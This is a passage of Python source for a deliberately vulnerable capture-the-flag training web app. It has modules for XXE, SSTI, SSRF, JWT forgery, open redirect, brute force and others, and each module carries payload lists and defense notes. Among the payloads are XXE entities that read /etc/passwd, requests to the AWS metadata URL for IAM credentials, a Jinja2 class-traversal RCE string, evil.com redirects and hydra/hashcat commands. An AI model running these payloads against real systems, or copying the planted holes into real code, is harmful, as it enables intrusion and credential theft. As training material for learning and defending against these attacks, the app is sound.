<div class="g2">
<div>
<div class="card"><h3>Login Panel <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>Username</label><input type="text" name="username" id="auth-input" placeholder="admin' OR '1'='1"><label>Password</label><input type="password" name="password" placeholder="anything"><button class="btn btn-d" type="submit">Login</button></form>{msg}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How SQLi Auth Bypass Works</h4>
<p>Injecting <code>admin'-- -</code> comments out the password check entirely.</p>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Parameterized queries for all DB interactions</li>
<li>Hash passwords with bcrypt or Argon2id</li>
<li>Account lockout after failed attempts</li>
<li>Multi-factor authentication</li>
</ul></div>
</div></div>""","auth-bypass", session)

def page_idor(params, session=None):
    lv=SECURITY_LEVEL["level"]; nid=params.get("id",["2"])[0]; result=""; CU="gordonb"
    conn=sqlite3.connect(DB_PATH); c=conn.cursor()
    if nid:
        try:
            i=int(nid)
            if lv=="low":
                c.execute("SELECT user,note FROM notes WHERE id=?",(i,)); row=c.fetchone()
                if row:
                    result=f'<div class="out">Owner: {html.escape(row[0])}\nNote: {html.escape(row[1])}</div>'
                    if row[0]!=CU: result+=f'<div class="flag">IDOR! You accessed {html.escape(row[0])}\'s private note!</div>'
                else: result='<div class="err">Note not found</div>'
            else:
                c.execute("SELECT user,note FROM notes WHERE id=? AND user=?",(i,CU)); row=c.fetchone()
                result=f'<div class="out">Note: {html.escape(row[1])}</div>' if row else '<div class="err">Access denied</div>'
        except: result='<div class="err">Invalid ID</div>'
    conn.close()
    pl=[("ID 1 — admin","Admin note","1"),("ID 3 — alice flag","Contains CTF flag","3"),("ID 0","Off-by-one","0"),("Negative","Wrap-around","-1")]
    ph='<div class="stitle">IDOR Test Values (click to fill)</div>'+"".join(pcard(t,d,p,"idor-input") for t,d,p in pl)
    return base_page("IDOR",f"""
<div class="ph"><h2>IDOR — Insecure Direct Object Reference</h2><p>Access unauthorized resources by manipulating IDs in requests.</p></div>
<div class="g2">
<div>
<div class="card"><h3>My Notes (as: {CU}) <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<p style="font-size:13px;color:#8b949e">Your note is ID 2. Try ID 1 (admin) and ID 3 (alice).</p>
<form method="GET"><label>Note ID</label><input type="number" name="id" id="idor-input" value="{html.escape(nid)}"><button class="btn btn-d" type="submit">View</button></form>{result}</div>
<div class="card"><h3>Test Values</h3>{ph}</div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Always verify ownership server-side on every request</li>
<li>Use random UUIDs instead of sequential integers</li>
<li>Implement object-level access control at the data layer</li>
</ul></div>
</div></div>""","idor", session)

def page_xxe(params, method="GET", body_params=None, session=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        xi=body_params.get("xml",[""])[0]
        if xi:
            if lv=="low":
                if "ENTITY" in xi.upper() and "/etc/passwd" in xi:
                    msg='<div class="flag">XXE FILE READ!\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...\nFLAG{xxe_passwd_read}</div>'
                elif "ENTITY" in xi.upper(): msg='<div class="flag">XXE entity processed — external entities ENABLED!</div>'
                else: msg='<div class="out">XML parsed — no entity injection detected</div>'
            else:
                if "ENTITY" in xi.upper() or "DOCTYPE" in xi.upper(): msg='<div class="err">Blocked: DOCTYPE and ENTITY declarations disabled</div>'
                else: msg='<div class="out">XML processed safely</div>'
    pl=[
        ("Classic /etc/passwd","Read system users",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<user><name>&xxe;</name></user>'),
        ("SSRF to metadata","Pivot to cloud metadata",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<user><name>&xxe;</name></user>'),
        ("Billion laughs DoS","Exponential entity expansion",'<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY lol "lol">\n<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;">\n]>\n<root>&lol2;</root>'),
    ]
    ph='<div class="stitle">XXE Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"xxe-input") for t,d,p in pl)
    return base_page("XXE",f"""
<div class="ph"><h2>XXE — XML External Entity Injection</h2><p>Exploit XML parsers to read local files, perform SSRF, and cause DoS.</p></div>
<div class="g2">
<div>
<div class="card"><h3>XML Parser <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>XML Input</label><textarea name="xml" id="xxe-input" rows="7" placeholder="Paste XXE payload here..."></textarea><button class="btn btn-d" type="submit">Parse</button></form>{msg}</div>
<div class="card"><h3>XXE Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Disable DTD processing in XML library</li>
<li>Python: use <code>defusedxml</code></li>
<li>Use JSON instead of XML where possible</li>
</ul></div>
</div></div>""","xxe", session)

def page_ssti(params, session=None):
    lv=SECURITY_LEVEL["level"]; ti=params.get("name",[""])[0]; out=""
    if ti:
        if lv=="low":
            if "{{" in ti and "}}" in ti:
                inner=ti.strip().strip("{").strip("}").strip()
                if re.match(r'^[\d\s\+\-\*\/\(\)\.]+$',inner):
                    try: out=f'<div class="flag">SSTI! Result: {html.escape(str(eval(inner)))}</div>'
                    except: out='<div class="flag">SSTI triggered (eval error)</div>'
                elif any(k in inner for k in ["__","import","os.","sys.","subprocess","open(","exec(","eval("]):
                    out=f'<div class="flag">SSTI RCE payload detected!\nFLAG{{ssti_rce_simulated}}</div>'
                else: out=f'<div class="flag">SSTI: Template expression detected: {html.escape(ti)}</div>'
            else: out=f'<div class="out">Hello, {html.escape(ti)}!</div>'
        else: out=f'<div class="out">Hello, {html.escape(ti)}!</div>'
    pl=[
        ("Detection","Confirm SSTI — result should be 49","{{7*7}}"),
        ("Jinja2 config","Dump Flask config","{{config}}"),
        ("Jinja2 RCE","Traverse class hierarchy","{{''.__class__.__mro__[1].__subclasses__()}}"),
        ("Twig detection","PHP Twig","{{7*'7'}}"),
    ]
    ph='<div class="stitle">SSTI Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"ssti-input") for t,d,p in pl)
    return base_page("SSTI",f"""
<div class="ph"><h2>SSTI — Server-Side Template Injection</h2><p>Inject template directives to execute code within the template engine context.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Name Greeter <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>Name</label><input type="text" name="name" id="ssti-input" value="{html.escape(ti)}" placeholder="{{{{7*7}}}}"><button class="btn btn-d" type="submit">Greet</button></form>{out}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:500px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Never pass user input to template render as template string</li>
<li>Pass as variable: <code>render_template('x.html', name=user_input)</code></li>
<li>Use sandboxed Jinja2 environment</li>
</ul></div>
</div></div>""","ssti", session)

def page_open_redirect(params, session=None):
    lv=SECURITY_LEVEL["level"]; url=params.get("url",[""])[0]; msg=""
    if url:
        if lv=="low": msg=f'<div class="flag">Open Redirect! Would redirect to: <a href="{html.escape(url)}" style="color:#58a6ff">{html.escape(url)}</a>\nFLAG{{open_redirect_success}}</div>'
        elif lv=="medium":
            if url.startswith("/") and not url.startswith("//"): msg=f'<div class="flag">Relative redirect OK: {html.escape(url)}</div>'
            else: msg='<div class="err">Only relative URLs allowed. Try // or /\\'
        else:
            if any(url.startswith(a) for a in ["http://127.0.0.1:8888","http://localhost:8888"]): msg=f'<div class="flag">Redirect allowed (allowlisted): {html.escape(url)}</div>'
            else: msg='<div class="err">Blocked: URL not in allowlist</div>'
    pl=[
        ("Basic external","Direct to attacker site","http://evil.com/phish"),
        ("Protocol-relative","Browser treats // as same-protocol","//evil.com"),
        ("At-sign bypass","Credentials confusion","http://trusted.com@evil.com"),
        ("JavaScript URI","Execute JS via redirect","javascript:alert(document.cookie)"),
    ]
    ph='<div class="stitle">Open Redirect Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"redir-input") for t,d,p in pl)
    return base_page("Open Redirect",f"""
<div class="ph"><h2>Open Redirect</h2><p>Abuse redirect parameters to send victims to attacker-controlled pages.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Post-Login Redirect <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>Redirect URL</label><input type="text" name="url" id="redir-input" value="{html.escape(url)}" placeholder="http://evil.com/phish"><button class="btn btn-d" type="submit">Test</button></form>{msg}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Strict allowlist of permitted redirect destinations</li>
<li>Only allow relative paths starting with <code>/</code></li>
</ul></div>
</div></div>""","open-redirect", session)

def page_insecure_deser(params, method="GET", body_params=None, session=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        payload=body_params.get("payload",[""])[0]
        if payload:
            if lv=="low":
                try:
                    decoded=base64.b64decode(payload).decode()
                    if any(k in decoded for k in ["os.system","__reduce__","subprocess","exec(","eval("]):
                        msg=f'<div class="flag">DESER RCE DETECTED!\nFLAG{{insecure_deser_rce}}</div>'
                    else:
                        data=json.loads(decoded)
                        if data.get("role")=="admin": msg=f'<div class="flag">PRIVILEGE ESCALATION!\nFLAG{{deser_role_escalation}}</div>'
                        else: msg=f'<div class="out">Session: {html.escape(json.dumps(data))}</div>'
                except Exception as e: msg=f'<div class="err">Error: {html.escape(str(e))}</div>'
            else:
                try:
                    decoded=base64.b64decode(payload).decode(); data=json.loads(decoded)
                    if isinstance(data,dict) and "username" in data:
                        if data.get("role") not in ["user"]: msg='<div class="err">Privilege escalation attempt blocked</div>'
                        else: msg=f'<div class="out">Session accepted: {html.escape(json.dumps(data))}</div>'
                    else: msg='<div class="err">Invalid session format</div>'
                except: msg='<div class="err">Invalid session data</div>'
    safe=base64.b64encode(json.dumps({"username":"gordonb","role":"user"}).encode()).decode()
    tampered=base64.b64encode(json.dumps({"username":"admin","role":"admin"}).encode()).decode()
    pl=[
        ("Normal user token","Valid session",safe),
        ("Role elevation to admin","Tamper role field",tampered),
        ("Username to admin",base64.b64encode(json.dumps({"username":"admin","role":"user"}).encode()).decode(),"Change username field"),
    ]
    ph='<div class="stitle">Session Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"deser-input") for t,d,p in pl)
    return base_page("Insecure Deser",f"""
<div class="ph"><h2>Insecure Deserialization</h2><p>Exploit unsafe object deserialization to achieve RCE or privilege escalation.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Session Token <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>Base64 Session Data</label><textarea name="payload" id="deser-input" rows="3">{html.escape(safe)}</textarea><button class="btn btn-d" type="submit">Submit</button></form>{msg}</div>
<div class="card"><h3>Payloads</h3>{ph}</div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Never deserialize untrusted data with pickle/Java serialization</li>
<li>Sign tokens with HMAC — use JWT or itsdangerous library</li>
<li>Use JSON with strict schema validation</li>
</ul></div>
</div></div>""","insecure-deser", session)

def page_weak_crypto(params, method="GET", body_params=None, session=None):
    msg=""
    if method=="POST" and body_params:
        text=body_params.get("text",[""])[0]
        if text:
            results={
                "MD5 [BROKEN]": hashlib.md5(text.encode()).hexdigest(),
                "SHA1 [WEAK]": hashlib.sha1(text.encode()).hexdigest(),
                "SHA256 [OK]": hashlib.sha256(text.encode()).hexdigest(),
                "SHA512 [BETTER]": hashlib.sha512(text.encode()).hexdigest(),
                "Base64 [NOT CRYPTO]": base64.b64encode(text.encode()).decode(),
            }
            rows="".join(f'<tr><td style="font-size:12px;color:#e3b341">{k}</td><td style="font-family:monospace;font-size:11px;word-break:break-all">{v}</td></tr>' for k,v in results.items())
            msg=f'<table><thead><tr><th>Algorithm</th><th>Output</th></tr></thead><tbody>{rows}</tbody></table>'
    known=[("5f4dcc3b5aa765d61d8327deb882cf99","password","MD5"),("e99a18c428cb38d5f260853678922e03","abc123","MD5"),("0d107d09f5bbe40cade3de5c71e9e9b7","letmein","MD5")]
    hrows="".join(f'<tr><td style="font-family:monospace;font-size:11px">{h}</td><td><code>{p}</code></td><td style="color:#8b949e">{a}</td></tr>' for h,p,a in known)
    return base_page("Weak Crypto",f"""
<div class="ph"><h2>Weak Cryptography</h2><p>Identify and exploit weak hashing algorithms and improper encoding.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Hash Generator</h3>
<form method="POST"><label>Plaintext</label><input type="text" name="text" placeholder="password123"><button class="btn btn-i" type="submit">Hash It</button></form>{msg}</div>
<div class="card"><h3>Known DB Hashes</h3>
<table><thead><tr><th>Hash</th><th>Plaintext</th><th>Algo</th></tr></thead><tbody>{hrows}</tbody></table>
<div class="hint" style="margin-top:.75rem">Crack: <code>hashcat -m 0 hashes.txt rockyou.txt</code></div></div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Use bcrypt: <code>import bcrypt; bcrypt.hashpw(pw, bcrypt.gensalt(rounds=12))</code></li>
<li>Or Argon2id — OWASP recommended</li>
<li>Never use MD5/SHA1 for passwords</li>
<li>Base64 is NOT encryption</li>
</ul></div>
</div></div>""","weak-crypto", session)

def page_jwt(params, method="GET", body_params=None, session=None):
    msg=""
    def mk(payload_dict, secret="secret123"):
        hdr=base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=').decode()
        bod=base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()
        sig=base64.urlsafe_b64encode(hmac.new(secret.encode(),f"{hdr}.{bod}".encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
        return f"{hdr}.{bod}.{sig}"
    sample=mk({"username":"gordonb","role":"user","exp":9999999999})
    ahdr=base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
    abod=base64.urlsafe_b64encode(json.dumps({"username":"admin","role":"admin","exp":9999999999}).encode()).rstrip(b'=').decode()
    none_tok=f"{ahdr}.{abod}."
    weak_tok=mk({"username":"gordonb","role":"user","exp":9999999999},"password")
    admin_weak=mk({"username":"admin","role":"admin","exp":9999999999},"password")
    if method=="POST" and body_params:
        token=body_params.get("token",[""])[0]
        if token:
            try:
                parts=token.split(".")
                if len(parts)==3:
                    hdr_d=json.loads(base64.urlsafe_b64decode(parts[0]+"=="))
                    bod_d=json.loads(base64.urlsafe_b64decode(parts[1]+"=="))
                    alg=hdr_d.get("alg","").lower()
                    if alg=="none":
                        msg=f'<div class="flag">ALG=NONE BYPASS!\nToken accepted without verification!\nUsername: {html.escape(str(bod_d.get("username")))} Role: {html.escape(str(bod_d.get("role")))}\nFLAG{{jwt_none_alg_bypass}}</div>'
                    elif alg=="hs256":
                        found=False
                        for sec in ["secret123","password","admin","secret","jwt_secret","dvwa","1234","changeme"]:
                            sc=base64.urlsafe_b64encode(hmac.new(sec.encode(),f"{parts[0]}.{parts[1]}".encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
                            if sc==parts[2]:
                                msg=f'<div class="flag">Valid JWT (secret: <code>{sec}</code>)\nUser: {html.escape(str(bod_d.get("username")))} Role: {html.escape(str(bod_d.get("role")))}</div>'
                                if bod_d.get("role")=="admin": msg+='<div class="flag">ADMIN ACCESS! FLAG{jwt_weak_secret_cracked}</div>'
                                found=True; break
                        if not found: msg='<div class="err">Invalid signature. Crack: <code>hashcat -m 16500 token.txt rockyou.txt</code></div>'
                    else: msg=f'<div class="out">Alg: {html.escape(alg)} | Claims: {html.escape(json.dumps(bod_d))}</div>'
                else: msg='<div class="err">Invalid JWT format</div>'
            except Exception as e: msg=f'<div class="err">Parse error: {html.escape(str(e))}</div>'
    pl=[
        ("Normal user token","Valid HS256 user token",sample),
        ("alg=none attack","Remove signature entirely",none_tok),
        ("Weak secret (password)","Signed with crackable secret",weak_tok),
        ("Admin + weak secret","Admin token — crackable",admin_weak),
    ]
    ph='<div class="stitle">JWT Attack Tokens (click to fill)</div>'+"".join(pcard(t,d,p,"jwt-input") for t,d,p in pl)
    return base_page("JWT Attacks",f"""
<div class="ph"><h2>JWT Attacks</h2><p>Forge, tamper, and exploit JSON Web Tokens to bypass authentication.</p></div>
<div class="g2">
<div>
<div class="card"><h3>JWT Verifier</h3>
<form method="POST"><label>JWT Token</label><textarea name="token" id="jwt-input" rows="4">{html.escape(sample)}</textarea><button class="btn btn-d" type="submit">Verify</button></form>{msg}</div>
<div class="card"><h3>Attack Tokens</h3>{ph}</div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Always verify signature server-side</li>
<li>Explicitly reject <code>alg=none</code> tokens</li>
<li>Use strong random secrets (256+ bits)</li>
<li>Prefer RS256 (asymmetric)</li>
<li>Short expiry + refresh token rotation</li>
</ul></div>
</div></div>""","jwt", session)

def page_rate_limit(params, method="GET", body_params=None, session=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        user=body_params.get("username",[""])[0]; pw=body_params.get("password",[""])[0]
        now=time.time(); key=f"127.0.0.1:{user}"
        if lv=="low":
            msg='<div class="flag">Login SUCCESS! FLAG{rate_limit_bypassed}</div>' if (user=="admin" and pw=="password") else '<div class="err">Invalid — no rate limit! Keep guessing...</div>'
        else:
            if key not in RATE_LIMIT_STORE: RATE_LIMIT_STORE[key]={"count":0,"window":now}
            st=RATE_LIMIT_STORE[key]
            if now-st["window"]>60: st["count"]=0; st["window"]=now
            st["count"]+=1; rem=max(0,5-st["count"])
            if st["count"]>5: msg=f'<div class="err">Rate limited! Wait {int(60-(now-st["window"]))}s</div>'
            elif user=="admin" and pw=="password": msg=f'<div class="flag">Login OK! ({rem} attempts left)</div>'
            else: msg=f'<div class="err">Invalid. ({rem} attempts before lockout)</div>'
    return base_page("Rate Limiting",f"""
<div class="ph"><h2>Missing Rate Limiting</h2><p>Brute-force credentials against endpoints with no lockout or CAPTCHA.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Login (No Rate Limit) <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<p style="font-size:13px;color:#8b949e">Hint: username=<code>admin</code>, password is in rockyou.txt</p>
<form method="POST"><label>Username</label><input type="text" name="username" value="admin"><label>Password</label><input type="password" name="password" placeholder="password, admin, 123456..."><button class="btn btn-d" type="submit">Login</button></form>{msg}</div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Rate limit: max 5 attempts per IP per minute</li>
<li>Account lockout after 10 failures</li>
<li>CAPTCHA after 3 consecutive failures</li>
<li>Multi-factor authentication</li>
<li>Exponential backoff</li>
</ul></div>
</div></div>""","rate-limit", session)

def page_bruteforce(params, method="GET", body_params=None, session=None):
    msg=""; result_table=""
    WL=["password","admin","123456","qwerty","letmein","12345","password123","admin123","root","toor","test","guest","master","dragon","iloveyou","monkey","shadow","sunshine","princess","welcome","login","abc123","pass","hello","charlie","1234","aa123456","changeme","password1","admin1234","secret"]
    if method=="POST" and body_params:
        tu=body_params.get("target_user",["admin"])[0]
        at=body_params.get("attack_type",["wordlist"])[0]
        cw=[w.strip() for w in body_params.get("custom_words",[""])[0].strip().split("\n") if w.strip()]
        wl=cw if (at=="custom" and cw) else WL
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        c.execute("SELECT username,password FROM users WHERE username=?",(tu,)); row=c.fetchone(); conn.close()
        if row:
            ah=row[1]; found=None; attempts=[]
            for pw in wl[:60]:
                ph=hashlib.md5(pw.encode()).hexdigest(); hit=(ph==ah)
                attempts.append((pw,ph,hit))
                if hit: found=pw; break
            def tr(p,h,hit):
                if hit: return f'<tr><td style="font-family:monospace;color:#7ee787">{html.escape(p)}</td><td style="font-family:monospace;font-size:11px;color:#7ee787">{h}</td><td style="color:#7ee787;font-weight:700">MATCH!</td></tr>'
                return f'<tr><td style="font-family:monospace;color:#8b949e">{html.escape(p)}</td><td style="font-family:monospace;font-size:11px;color:#8b949e">{h}</td><td style="color:#8b949e">no</td></tr>'
            result_table=f'<table style="margin-top:.75rem"><thead><tr><th>Password tried</th><th>MD5 hash</th><th>Result</th></tr></thead><tbody>{"".join(tr(p,h,hi) for p,h,hi in attempts)}</tbody></table>'
            msg=f'<div class="flag">CRACKED for {html.escape(tu)}: <strong>{html.escape(found)}</strong></div>' if found else f'<div class="err">Not found in {len(wl[:60])}-entry list.</div>'
        else: msg=f'<div class="err">User not found: {html.escape(tu)}</div>'
    return base_page("Brute Force",f"""
<div class="ph"><h2>Brute Force — Credential Cracking Lab</h2><p>Simulate offline hash cracking and online credential brute-force.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Offline Hash Cracker</h3>
<form method="POST">
<label>Target Username</label>
<select name="target_user"><option value="admin">admin</option><option value="gordonb">gordonb</option><option value="1337">1337</option><option value="pablo">pablo</option><option value="smithy">smithy</option><option value="alice">alice</option></select>
<label>Attack Type</label>
<select name="attack_type"><option value="wordlist">Built-in wordlist</option><option value="custom">Custom wordlist</option></select>
<label>Custom Wordlist (one per line)</label>
<textarea name="custom_words" rows="4" placeholder="password&#10;admin&#10;123456"></textarea>
<button class="btn btn-d" type="submit">Launch Attack</button></form>
{msg}{result_table}</div>
</div>
<div>
<div class="ibox"><h4>Hashcat Reference</h4>
<div class="pbox"><div class="ptitle">MD5 dictionary</div><code>hashcat -m 0 hashes.txt rockyou.txt</code></div>
<div class="pbox"><div class="ptitle">With rules</div><code>hashcat -m 0 hashes.txt rockyou.txt -r best64.rule</code></div>
<div class="pbox"><div class="ptitle">Hydra HTTP POST</div><code>hydra -l admin -P rockyou.txt 127.0.0.1 http-post-form '/auth-bypass:username=^USER^&password=^PASS^:Invalid' -t 4</code></div>
</div>
</div></div>""","bruteforce", session)

def page_ssrf(params, method="GET", body_params=None, session=None):
    lv=SECURITY_LEVEL["level"]
    url=(body_params or params).get("url",[""])[0]; msg=""
    if url:
        if lv=="low":
            sims={"169.254.169.254":'{"iam":{"role":"EC2Role"},"secret":"FLAG{ssrf_cloud_metadata}"}',
                  "localhost":"HTTP/1.1 200 OK\n[Internal admin panel]\nFLAG{ssrf_localhost_access}",
                  "127.0.0.1":"HTTP/1.1 200 OK\n[Internal admin interface]"}
            sim=next((v for k,v in sims.items() if k in url),"[Simulated response from "+url+"]")
            if any(x in url for x in ["169.254","localhost","127.","0.0.0.0","internal","redis","::1"]):
                msg=f'<div class="flag">SSRF! Server fetched: {html.escape(url)}\n\n{html.escape(sim)}</div>'
            else: msg=f'<div class="out">External URL fetched: {html.escape(url)}\n[Simulated]</div>'
        elif lv=="medium":
            blocked=["169.254","10.","192.168.","172.16.","127.","localhost","0.0.0.0","::1"]
            if any(b in url for b in blocked): msg='<div class="err">Blocked: private IP ranges filtered.</div>'
            else: msg=f'<div class="out">External fetch: {html.escape(url)}</div>'
        else:
            if any(url.startswith(a) for a in ["https://example.com","https://api.github.com"]): msg=f'<div class="out">Allowlisted: {html.escape(url)}</div>'
            else: msg='<div class="err">URL not in allowlist</div>'
    pl=[
        ("AWS EC2 metadata","Steal IAM credentials","http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("Localhost admin","Access internal admin panel","http://localhost:8080/admin"),
        ("Redis SSRF","Unauthenticated Redis","http://localhost:6379/"),
        ("Decimal IP bypass","127.0.0.1 in decimal","http://2130706433/"),
    ]
    ph='<div class="stitle">SSRF Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"ssrf-input") for t,d,p in pl)
    return base_page("SSRF",f"""
<div class="ph"><h2>SSRF — Server-Side Request Forgery</h2><p>Force the server to make HTTP requests to internal or cloud metadata services.</p></div>
<div class="g2">
<div>
<div class="card"><h3>URL Fetcher <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>URL to Fetch</label><input type="text" name="url" id="ssrf-input" value="{html.escape(url)}" placeholder="http://169.254.169.254/latest/meta-data/"><button class="btn btn-d" type="submit">Fetch</button></form>{msg}</div>
<div class="card"><h3>SSRF Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Allowlist permitted URL schemes and domains</li>
<li>Block all RFC1918 private ranges and loopback</li>
<li>Resolve hostname and validate resolved IP</li>
</ul></div>
</div></div>""","ssrf", session)

def page_clickjacking(params, session=None):
    return base_page("Clickjacking","""
<div class="ph"><h2>Clickjacking</h2><p>Trick users into clicking hidden UI elements by overlaying a transparent iframe over a decoy page.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Demo</h3>
<div style="position:relative;height:100px;background:#0d1117;border:1px solid #30363d;border-radius:6px;overflow:hidden">
<iframe src="/csrf" style="opacity:0.08;position:absolute;top:0;left:0;width:100%;height:300px;pointer-events:none"></iframe>
<div style="position:absolute;top:28px;left:30px"><button class="btn btn-w" onclick="alert('You clicked the decoy — in a real attack, you clicked the hidden target underneath!')">WIN A PRIZE — CLICK HERE!</button></div>
</div>
</div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li><code>X-Frame-Options: DENY</code></li>
<li>CSP: <code>frame-ancestors 'none'</code></li>
</ul></div>
</div></div>""","clickjacking", session)

def page_hpp(params, session=None):
    lv=SECURITY_LEVEL["level"]; vals=params.get("role",[]); result=""
    if vals:
        lv_use=vals[-1] if lv=="low" else vals[0]
        result=f'<div class="flag">HPP! Server used: <code>role={html.escape(lv_use)}</code>' + ("\nFLAG{hpp_role_escalation}" if lv_use=="admin" else "") + '</div>'
    return base_page("HTTP Param Poll",f"""
<div class="ph"><h2>HTTP Parameter Pollution</h2><p>Inject duplicate parameters to bypass WAFs and manipulate application logic.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Role via HPP <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<p style="font-size:13px;color:#8b949e">Try: <code>?role=user&role=admin</code></p>
<a href="/hpp?role=user" class="btn btn-s">Normal</a>
<a href="/hpp?role=user&role=admin" class="btn btn-d">HPP Attack</a>
{result}</div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Use framework standard parameter parsing</li>
<li>Explicitly reject requests with duplicate sensitive parameters</li>
</ul></div>
</div></div>""","hpp", session)

def page_cors(params, session=None):
    return base_page("CORS Misconfig","""
<div class="ph"><h2>CORS Misconfiguration</h2><p>Exploit permissive Cross-Origin headers to read authenticated responses.</p></div>
<div class="g2">
<div>
<div class="card"><h3>CORS PoC Demo</h3>
<button class="btn btn-d" onclick="testCors()">Simulate CORS Data Theft</button>
<div id="cors-out" class="out" style="min-height:40px;margin-top:.5rem"></div>
</div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Validate Origin against strict allowlist</li>
<li>Never reflect arbitrary Origins with credentials</li>
<li>Avoid <code>Access-Control-Allow-Origin: *</code> on sensitive endpoints</li>
</ul></div>
</div></div>
<script>
function testCors(){var o=document.getElementById("cors-out");o.textContent="Sending cross-origin request...";setTimeout(function(){o.textContent='Simulated response:\n{\n  "username": "admin",\n  "role": "admin",\n  "secret_key": "s3cr3t_api_k3y"\n}\n\nFLAG{cors_misconfiguration_exploited}';o.style.color="#7ee787";},900);}
</script>""","cors", session)

def page_security(params, method="GET", body_params=None, session=None):
    if method=="POST" and body_params:
        lv=body_params.get("level",["low"])[0]
        if lv in ("low","medium","high"): SECURITY_LEVEL["level"]=lv
    cur=SECURITY_LEVEL["level"]
    opts="".join(f'<option value="{l}" {"selected" if l==cur else ""}>{l.upper()} — '+{"low":"No defenses — fully exploitable","medium":"Partial defenses — bypassable","high":"Correct secure implementation"}[l]+'</option>' for l in ["low","medium","high"])
    return base_page("Security Level",f"""
<div class="ph"><h2>Security Level</h2><p>Toggle defenses across all 23 vulnerability modules.</p></div>
<div class="card" style="max-width:520px"><h3>Current: <span class="lbadge">{cur.upper()}</span></h3>
<form method="POST" style="margin-top:1rem"><label>Level</label><select name="level">{opts}</select><button class="btn btn-p" type="submit">Apply</button></form></div>""","security", session)

# ── THREADED HTTP SERVER ───────────────────────────────────────────────────────
class ThreadedHTTPServer(ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

class DVWAHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def parse_body(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            if length > 0:
                return urllib.parse.parse_qs(self.rfile.read(min(length, 65536)).decode("utf-8", errors="replace"))
        except Exception: pass
        return {}

    def send_html(self, content, status=200, extra_headers=None):
        enc = content.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", len(enc))
        self.send_header("Connection", "keep-alive")
        if extra_headers:
            for k, v in extra_headers.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(enc)

    def send_redirect(self, location, set_cookie=None, status=302):
        self.send_response(status)
        self.send_header("Location", location)
        if set_cookie:
            self.send_header("Set-Cookie", set_cookie)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def route(self, path, params, method="GET", body=None):
        # ── File uploads ──────────────────────────────────────────────────
        if path.startswith("/uploads/"):
            return self.serve_upload(path[9:], params), None, None

        sess = get_session(self)

        # ── Public routes (no login required) ─────────────────────────────
        if path == "/login":
            result, cookie, redirect = page_login(params, method, body, self)
            if redirect:
                return None, cookie, redirect
            return result, cookie, None

        if path == "/forgot-password":
            return page_forgot_password(params, method, body), None, None

        if path == "/logout":
            return do_logout(self)

        # ── Security level is accessible without login (for initial setup) ─
        if path == "/security":
            return page_security(params, method, body, sess), None, None

